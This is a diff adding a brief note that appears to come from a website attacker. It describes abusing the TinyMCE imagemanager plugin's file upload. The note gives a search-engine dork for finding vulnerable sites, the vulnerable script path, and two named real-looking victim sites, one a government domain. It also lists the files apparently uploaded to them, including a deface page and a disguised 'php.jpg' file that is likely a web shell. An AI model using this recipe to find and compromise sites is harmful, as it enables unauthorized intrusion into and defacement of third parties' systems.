@@ -1,0 +1,14 @@
+tinymce imagemanager
+
+inurl:get_bthumb_jpg.php?im=
+
+BUG :
+/jscripts/tinymce/jscripts/tiny_mce/imagemanager/images.php
+
+EXAMPLE :
+http://www.tnp2k.go.id/jscripts/tinymce/jscripts/tiny_mce/imagemanager/manager.php
+https://www.kamarupa.co.id/jscripts/tinymce/jscripts/tiny_mce/imagemanager/manager.php
+
+RESULT :
+http://www.tnp2k.go.id/UserFiles/Image/z.htm
+https://www.kamarupa.co.id/UserFiles/Image/yusa.php.jpg
